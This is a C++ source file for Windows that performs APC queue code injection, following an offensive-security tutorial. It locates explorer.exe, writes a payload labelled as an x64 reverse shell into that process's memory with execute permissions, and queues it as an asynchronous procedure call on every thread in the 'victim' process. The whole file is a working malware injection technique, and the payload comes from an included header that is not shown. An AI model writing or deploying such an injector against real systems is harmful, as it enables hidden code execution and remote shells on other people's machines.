#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <optional>

#include "Payloads.h"

// based on https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
// desc: injection into explorer.exe process, this process has many threads and one of them is almost always in alertable state
// 1. find explorer.exe
// 2. inject into process memory
// 3. find all threads of main process
// 4. prepare APC queue with routine set on shellcode address for each process
// 5. routine in APC of alertable thread would be run when sheduler context switch on alertable thread
int main()
{
	//auto unsigned shellcode = Shellcode::x64_notepad; // not working
	// find process which would be used for injection (explorer.exe)
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(snapshot, &processEntry))
	{
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0)
		{
			Process32Next(snapshot, &processEntry);
		}
	}

	// write shellcode into process memory (virtual address space)
	auto& shellcode = Payloads::x64_reverse_shell;
	SIZE_T shellSize = sizeof shellcode;
	HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);

	// get all victims process thread ids
	HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	if (Thread32First(processSnapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(processSnapshot, &threadEntry));
	}

	// iterate through victim process threads and add apc routine for each of them
	// target victim thread has to be alertable (explorer.exe has lot of threads and there is chance that at least one would be alertable)
	// guess: sleep here doesn't have impact on alertable thread state but is necessary for execution of apc time to scheduler run alertable thread before main process exit
	HANDLE threadHandle;
	for (DWORD threadId : threadIds) {
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		Sleep(500);
	}
}
